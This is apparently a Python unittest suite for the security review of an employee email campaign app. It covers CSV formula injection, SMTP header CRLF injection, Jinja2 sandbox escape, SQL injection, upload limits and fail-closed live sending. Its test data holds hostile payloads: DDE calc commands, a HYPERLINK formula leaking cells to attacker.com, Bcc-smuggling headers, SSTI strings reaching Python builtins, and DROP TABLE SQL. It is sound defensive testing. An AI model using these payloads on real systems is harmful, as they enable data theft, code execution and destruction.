"""
Phase 8 Comprehensive Security Review & End-to-End Validation Test Suite.
Verifies:
1. Complete E2E business workflow: Employee -> Template -> Campaign -> Targeting -> Preview -> Simulation -> Status Tracking -> Analytics -> CSV Export.
2. CSV Formula Injection (CWE-1236) sanitization across analytics, employees, and delivery reporters.
3. SMTP Header Injection / CRLF (CWE-93) protection.
4. Jinja2 SandboxedEnvironment security enforcement (blocking __class__, __mro__, etc.).
5. Fail-closed live delivery safety enforcement (CLI, Worker, Mailer, API).
6. CSV file upload size and format validation (10MB limit / HTTP 413).
7. SQL injection safety across query parameters.
8. Zero credentials or sensitive data disclosure in API responses and exported reports.
"""
import os
import io
import csv
import uuid
import asyncio
import datetime
import unittest
from fastapi import HTTPException
from starlette.datastructures import UploadFile

from db.database import SessionLocal, init_db
from db.models import Employee, EmailTemplate, Campaign, CampaignRecipient, ReminderJob, MessageLog, utc_now
from api.app import trigger_dispatch
from api.routes.employees import import_employees_csv
from api.routes.scheduler import trigger_scheduler_cycle
from src.services import employee_service, template_service, campaign_service, analytics_service, scheduling_service
from src.services.analytics_service import sanitize_csv_cell as analytics_sanitize
from src.services.employee_service import sanitize_csv_cell as employee_sanitize
from src.smtp_client import sanitize_header_value, SMTPClient, SMTPConfig
from src.mailer import EmailSender, sanitize_header_value as mailer_sanitize_header
from src.reporter import DeliveryReporter, sanitize_csv_cell as reporter_sanitize
from src.worker import BackgroundWorker
from api.schemas import (
    EmployeeCreate, EmailTemplateCreate, CampaignCreate
)


class TestPhase8SecurityAndE2E(unittest.TestCase):
    """Phase 8 Security Hardening and Full E2E Workflow Test Suite."""

    @classmethod
    def setUpClass(cls):
        init_db()

    def setUp(self):
        self.session = SessionLocal()
        self.test_prefix = f"sec_{datetime.datetime.now().strftime('%H%M%S%f')}"
        self.orig_confirm = os.environ.get("CONFIRM_LIVE_DELIVERY")
        if "CONFIRM_LIVE_DELIVERY" in os.environ:
            del os.environ["CONFIRM_LIVE_DELIVERY"]

    def tearDown(self):
        if self.orig_confirm is not None:
            os.environ["CONFIRM_LIVE_DELIVERY"] = self.orig_confirm
        elif "CONFIRM_LIVE_DELIVERY" in os.environ:
            del os.environ["CONFIRM_LIVE_DELIVERY"]

        # Clean up created test entities
        try:
            self.session.query(MessageLog).filter(MessageLog.recipient_email.like(f"%{self.test_prefix}%")).delete(synchronize_session=False)
            self.session.query(CampaignRecipient).filter(CampaignRecipient.recipient_email.like(f"%{self.test_prefix}%")).delete(synchronize_session=False)
            self.session.query(Campaign).filter(Campaign.campaign_name.like(f"%{self.test_prefix}%")).delete(synchronize_session=False)
            self.session.query(EmailTemplate).filter(EmailTemplate.template_name.like(f"%{self.test_prefix}%")).delete(synchronize_session=False)
            self.session.query(Employee).filter(Employee.email.like(f"%{self.test_prefix}%")).delete(synchronize_session=False)
            self.session.commit()
        except Exception:
            self.session.rollback()
        finally:
            self.session.close()

    # =========================================================================
    # 1. COMPLETE END-TO-END WORKFLOW TEST
    # =========================================================================
    def test_complete_e2e_workflow(self):
        """
        Tests the entire end-to-end user workflow:
        Employee creation -> Template creation -> Campaign creation ->
        Recipient selection -> Personalized preview -> Simulation execution ->
        MessageLog verification -> Analytics aggregation -> CSV export.
        """
        # Step 1: Create Employee
        emp_in = EmployeeCreate(
            employee_id=f"EMP_{self.test_prefix}",
            full_name="Priya Sharma",
            email=f"priya.{self.test_prefix}@testcorp.com",
            company="Nexus Technologies",
            department="Engineering",
            designation="Principal Architect",
            timezone="Asia/Kolkata",
            employment_status="Active"
        )
        emp = employee_service.create_employee(self.session, emp_in)
        self.assertIsNotNone(emp.id)

        # Step 2: Create Template
        tmpl_in = EmailTemplateCreate(
            template_name=f"E2E Architecture Briefing {self.test_prefix}",
            category="Technical Training",
            subject="System Architecture Update - {{full_name}}",
            body="Hello {{full_name}}, welcome to {{company}} {{department}} team."
        )
        tmpl = template_service.create_template(self.session, tmpl_in)
        self.assertIsNotNone(tmpl.id)

        # Step 3: Create Campaign
        camp_in = CampaignCreate(
            campaign_name=f"E2E Campaign {self.test_prefix}",
            template_id=tmpl.id,
            description="End-to-end security and delivery validation campaign",
            recipient_employee_ids=[emp.id]
        )
        camp = campaign_service.create_campaign(self.session, camp_in)
        self.assertEqual(len(camp.recipients), 1)

        # Step 4: Preview Personalized Email
        preview = campaign_service.preview_campaign_for_recipient(
            self.session, camp.id, emp.id
        )
        self.assertTrue(preview.is_valid)
        self.assertIn("Priya Sharma", preview.rendered_subject)
        self.assertIn("Nexus Technologies", preview.rendered_html)
        self.assertIn("Engineering", preview.rendered_html)

        # Step 5: Execute Campaign in Simulation Mode
        summary = scheduling_service.process_due_campaign(
            db=self.session,
            campaign=camp,
            simulation_mode=True
        )
        self.assertEqual(summary["total_recipients"], 1)
        self.assertEqual(summary["simulated"], 1)
        self.assertEqual(len(summary["errors"]), 0)

        # Step 6: Verify MessageLog Record
        log = self.session.query(MessageLog).filter(
            MessageLog.campaign_id == camp.id,
            MessageLog.recipient_email == emp.email
        ).first()
        self.assertIsNotNone(log)
        self.assertEqual(log.execution_mode, "SIMULATION")
        self.assertEqual(log.execution_status, "SIMULATED_SUCCESS")
        self.assertEqual(len(log.execution_key), 40)
        self.assertIsNotNone(log.executed_at)

        # Step 7: Query Analytics KPIs
        kpis = analytics_service.get_overview_kpis(self.session, campaign_id=camp.id)
        self.assertGreaterEqual(kpis["total_executions"], 1)
        self.assertGreaterEqual(kpis["simulated_emails"], 1)
        self.assertEqual(kpis["failed_emails"], 0)

        # Step 8: Verify Status Distribution
        dist = analytics_service.get_status_distribution(self.session, campaign_id=camp.id)
        status_names = [d["status"] for d in dist]
        self.assertIn("SIMULATED_SUCCESS", status_names)

        # Step 9: Export Analytics CSV Report
        csv_content, filename = analytics_service.export_analytics_csv(
            self.session, export_type="complete", campaign_id=camp.id
        )
        self.assertTrue(filename.startswith("delivery_audit_complete_"))
        self.assertIn("priya.", csv_content)
        self.assertIn("SIMULATED_SUCCESS", csv_content)

    # =========================================================================
    # 2. CSV FORMULA INJECTION (CWE-1236) TESTS
    # =========================================================================
    def test_csv_formula_injection_sanitization(self):
        """
        Verifies that cells starting with =, +, -, @, \\t, \\r are safely prefixed with '
        in all CSV exporters to prevent remote command execution / DDE in spreadsheet applications.
        """
        malicious_inputs = [
            "=cmd|' /C calc'!A0",
            "+1234567890",
            "-5+5",
            "@SUM(1,2)",
            "\tTAB_INJECT",
            "\rCR_INJECT"
        ]

        for payload in malicious_inputs:
            sanitized = analytics_sanitize(payload)
            self.assertTrue(
                sanitized.startswith("'"),
                f"Payload '{payload}' was not sanitized with leading quote: '{sanitized}'"
            )
            # Check employee service sanitizer
            self.assertTrue(employee_sanitize(payload).startswith("'"))
            # Check reporter sanitizer
            self.assertTrue(reporter_sanitize(payload).startswith("'"))

        # Verify safe strings are unaltered
        safe_inputs = ["Normal Text", "john.doe@example.com", "EMP-101", 42, 3.14]
        for safe in safe_inputs:
            self.assertEqual(analytics_sanitize(safe), safe)

    def test_analytics_csv_export_mitigates_formula_injection(self):
        """
        Creates a MessageLog record containing a formula injection payload and
        verifies that the exported CSV escapes it.
        """
        formula_subject = "=HYPERLINK(\"http://attacker.com/leak?data=\" & A1, \"Click Here\")"
        log = MessageLog(
            execution_key=f"inj_{uuid.uuid4().hex[:12]}",
            execution_mode="SIMULATION",
            execution_status="SIMULATED_SUCCESS",
            attempt_count=1,
            recipient_email=f"formula.{self.test_prefix}@testcorp.com",
            subject=formula_subject,
            message_id=f"<formula_{self.test_prefix}@testcorp.com>",
            executed_at=utc_now()
        )
        self.session.add(log)
        self.session.commit()

        csv_content, _ = analytics_service.export_analytics_csv(
            self.session,
            export_type="complete",
            search=f"formula.{self.test_prefix}"
        )
        reader = csv.reader(io.StringIO(csv_content))
        rows = list(reader)
        matching = [r for r in rows if len(r) > 6 and f"formula.{self.test_prefix}" in r[5]]
        self.assertEqual(len(matching), 1)
        exported_subject = matching[0][6]
        self.assertTrue(
            exported_subject.startswith("'="),
            f"Expected subject to be escaped with leading quote, got: {exported_subject}"
        )

    def test_employee_csv_export_mitigates_formula_injection(self):
        """Verifies employee export escapes formulas in company or name fields."""
        emp = Employee(
            employee_id=f"EMP_FORMULA_{self.test_prefix}",
            full_name="@SUM(1,2,3)",
            email=f"formula.emp.{self.test_prefix}@testcorp.com",
            company="=cmd|'/C calc'!A0",
            department="Finance",
            designation="Auditor",
            employment_status="Active"
        )
        self.session.add(emp)
        self.session.commit()

        csv_content = employee_service.export_employees_to_csv(
            self.session, search=f"formula.emp.{self.test_prefix}"
        )
        reader = csv.reader(io.StringIO(csv_content))
        rows = list(reader)
        matching = [r for r in rows if len(r) > 3 and f"formula.emp.{self.test_prefix}" in r[2]]
        self.assertEqual(len(matching), 1)
        name_cell = matching[0][1]
        company_cell = matching[0][3]
        self.assertTrue(name_cell.startswith("'@"), f"Name cell not escaped: {name_cell}")
        self.assertTrue(company_cell.startswith("'="), f"Company cell not escaped: {company_cell}")

    # =========================================================================
    # 3. SMTP HEADER INJECTION / CRLF (CWE-93) TESTS
    # =========================================================================
    def test_smtp_header_crlf_sanitization(self):
        """Verifies that CRLF characters are stripped from headers to prevent SMTP header injection."""
        crlf_subject = "Urgent Notice\r\nBcc: evil@attacker.com\r\nSubject: Injected"
        clean = sanitize_header_value(crlf_subject)
        self.assertNotIn("\r", clean)
        self.assertNotIn("\n", clean)
        self.assertIn("Urgent Notice", clean)
        self.assertIn("evil@attacker.com", clean)

    def test_smtp_client_build_multipart_message_crlf_safety(self):
        """Verifies that build_multipart_message strips newlines from Subject, To, From, and custom headers."""
        cfg = SMTPConfig(
            host="smtp.testserver.com",
            port=587,
            user="user@testserver.com",
            password="secretpassword",
            from_name="Safe Sender\r\nInjected-From: bad@evil.com",
            from_email="safe@testserver.com"
        )
        client = SMTPClient(cfg)
        msg = client.build_multipart_message(
            to_email="recipient@testserver.com\r\nCc: victim@testserver.com",
            subject="Status Update\r\nInjected-Header: malicious",
            html_content="<p>Test Content</p>",
            custom_headers={"X-Test-Diagnostic\r\nEvil": "Header Value\r\nInjected: True"}
        )

        for header_name, header_value in msg.items():
            self.assertNotIn("\r", header_name, f"Header name contained \\r: {header_name}")
            self.assertNotIn("\n", header_name, f"Header name contained \\n: {header_name}")
            self.assertNotIn("\r", str(header_value), f"Header value contained \\r: {header_value}")
            self.assertNotIn("\n", str(header_value), f"Header value contained \\n: {header_value}")

    def test_mailer_build_message_crlf_safety(self):
        """Verifies that EmailSender.build_message sanitizes CRLF headers."""
        sender = EmailSender(dry_run=True)
        msg = sender.build_message(
            to_email="test@example.com\r\nBcc: spy@attacker.com",
            subject="Reminder\r\nSubject: Overwrite",
            html_content="<p>Hello</p>"
        )
        self.assertNotIn("\r", msg["Subject"])
        self.assertNotIn("\n", msg["Subject"])
        self.assertNotIn("\r", msg["To"])
        self.assertNotIn("\n", msg["To"])

    # =========================================================================
    # 4. TEMPLATE SANDBOXING SECURITY TESTS
    # =========================================================================
    def test_jinja2_sandboxed_environment_blocks_python_internals(self):
        """Verifies that template rendering blocks attempts to access Python builtins or __class__."""
        malicious_templates = [
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ config.__class__ }}",
            "{{ self.__init__.__globals__.__builtins__ }}"
        ]

        for tmpl_str in malicious_templates:
            preview = template_service.render_template_preview(
                self.session,
                subject_tmpl="Security Test",
                body_tmpl=tmpl_str
            )
            # Either syntax/validation error or sandboxed environment blocking
            self.assertFalse(
                preview.is_valid,
                f"Expected malicious template '{tmpl_str}' to be rejected, but it succeeded."
            )

    def test_template_syntax_validation_catches_malformed_syntax(self):
        """Verifies that malformed Jinja2 syntax does not crash the server and returns handled error."""
        preview = template_service.render_template_preview(
            self.session,
            subject_tmpl="Test {% unclosed_block",
            body_tmpl="<p>Content</p>"
        )
        self.assertFalse(preview.is_valid)
        self.assertIsNotNone(preview.validation_error)

    # =========================================================================
    # 5. FAIL-CLOSED LIVE DELIVERY SAFETY TESTS
    # =========================================================================
    def test_worker_and_service_refuses_live_smtp_without_confirmation(self):
        """Verifies that BackgroundWorker and scheduling_service strictly refuse LIVE_SMTP when CONFIRM_LIVE_DELIVERY is unset."""
        if "CONFIRM_LIVE_DELIVERY" in os.environ:
            del os.environ["CONFIRM_LIVE_DELIVERY"]

        # BackgroundWorker refusal
        with self.assertRaises(ValueError) as ctx:
            BackgroundWorker(simulation_mode=False)
        self.assertIn("Safety Refusal", str(ctx.exception))

        # scheduling_service refusal
        res = scheduling_service.run_pending_jobs(db=self.session, simulation_mode=False)
        self.assertIn("Safety refusal", res["errors"][0])
        self.assertEqual(res["messages_accepted"], 0)

    def test_emailsender_refuses_live_send_without_confirmation(self):
        """Verifies that EmailSender(dry_run=False) refuses to send when CONFIRM_LIVE_DELIVERY is unset."""
        if "CONFIRM_LIVE_DELIVERY" in os.environ:
            del os.environ["CONFIRM_LIVE_DELIVERY"]

        sender = EmailSender(dry_run=False)
        result = sender.send_email(
            to_email="victim@example.com",
            subject="Test Live",
            html_content="<p>Test</p>"
        )
        self.assertEqual(result["status"], "FAILED")
        self.assertIn("Safety Refusal", result["error"])

    def test_api_dispatch_batch_refuses_live_mode_without_confirmation(self):
        """Verifies that trigger_dispatch(dry_run=False) fails closed with HTTP 400 when unconfirmed."""
        if "CONFIRM_LIVE_DELIVERY" in os.environ:
            del os.environ["CONFIRM_LIVE_DELIVERY"]

        with self.assertRaises(HTTPException) as ctx:
            trigger_dispatch(dry_run=False)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("Safety Refusal", ctx.exception.detail)

    def test_api_scheduler_trigger_refuses_live_mode_without_confirmation(self):
        """Verifies that trigger_scheduler_cycle(simulation=False, confirm_live=False) raises HTTP 400."""
        with self.assertRaises(HTTPException) as ctx:
            trigger_scheduler_cycle(simulation=False, confirm_live=False, db=self.session)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("Safety refusal", ctx.exception.detail)

    # =========================================================================
    # 6. CSV UPLOAD SIZE & FORMAT LIMITATION TESTS
    # =========================================================================
    def test_import_employees_csv_rejects_non_csv_extension(self):
        """Verifies that non-.csv uploads are rejected with HTTP 400."""
        upload_file = UploadFile(filename="malicious.exe", file=io.BytesIO(b"binary data"))
        with self.assertRaises(HTTPException) as ctx:
            import_employees_csv(file=upload_file, db=self.session)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("Invalid file format", ctx.exception.detail)

    def test_import_employees_csv_rejects_oversized_payload(self):
        """Verifies that CSV uploads exceeding 10MB are rejected with HTTP 413."""
        oversized_data = b"x" * (11 * 1024 * 1024)
        upload_file = UploadFile(filename="huge.csv", file=io.BytesIO(oversized_data))
        with self.assertRaises(HTTPException) as ctx:
            import_employees_csv(file=upload_file, db=self.session)
        self.assertEqual(ctx.exception.status_code, 413)
        self.assertIn("exceeds maximum allowed size", ctx.exception.detail)

    # =========================================================================
    # 7. SQL INJECTION DEFENSE TESTS
    # =========================================================================
    def test_sql_injection_safety_on_search_and_filters(self):
        """
        Verifies that passing SQL injection strings to search and filter queries
        does not crash the database or execute arbitrary SQL.
        """
        sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE message_logs; --",
            "' UNION SELECT * FROM employees --"
        ]

        for payload in sql_injection_payloads:
            # 1. Employees search
            items, total = employee_service.list_employees(self.session, search=payload)
            self.assertIsInstance(items, list)

            # 2. Templates search
            tmpls, total = template_service.list_templates(self.session, search=payload)
            self.assertIsInstance(tmpls, list)

            # 3. Campaigns search
            camps, total = campaign_service.list_campaigns(self.session, search=payload)
            self.assertIsInstance(camps, list)

            # 4. Analytics logs search
            logs, total, pages = analytics_service.get_recent_activity(self.session, search=payload)
            self.assertIsInstance(logs, list)

    # =========================================================================
    # 8. SENSITIVE CREDENTIAL DISCLOSURE PREVENTION TESTS
    # =========================================================================
    def test_zero_credential_leakage_in_api_and_exports(self):
        """
        Verifies that KPI outputs, logs queries, and exported CSVs never leak
        passwords, secrets, or SMTP authentication strings.
        """
        kpis = analytics_service.get_overview_kpis(self.session)
        kpi_str = str(kpis).lower()
        self.assertNotIn("smtp_pass", kpi_str)
        self.assertNotIn("password", kpi_str)

        logs, _, _ = analytics_service.get_recent_activity(self.session)
        logs_str = str(logs).lower()
        self.assertNotIn("smtp_pass", logs_str)

        csv_content, _ = analytics_service.export_analytics_csv(self.session, export_type="complete")
        lower_csv = csv_content.lower()
        self.assertNotIn("password", lower_csv)
        self.assertNotIn("secret", lower_csv)


if __name__ == "__main__":
    unittest.main()
